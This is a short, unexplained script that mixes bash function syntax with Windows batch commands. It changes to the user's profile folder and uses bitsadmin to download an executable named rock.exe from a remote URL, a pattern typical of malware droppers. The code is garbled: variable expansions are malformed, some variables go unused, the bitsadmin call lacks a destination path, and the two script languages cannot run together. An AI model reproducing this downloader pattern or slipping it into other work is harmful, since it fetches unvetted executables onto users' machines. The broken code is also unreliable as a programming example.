
#
# Bind.
#

bind() {
  local home=%userprofile%

  move $(home)
  load https://code.rock.link/tool/rock.exe
}

move() {
  cd $1
}

load() {
  local i=$1
  local t=3
  local s=$(make)

  bitsadmin /transfer ink /download /priority normal $(i)
}

make() {
  @echo off
  setlocal enableextensions
  md %1
  endlocal
}

bind
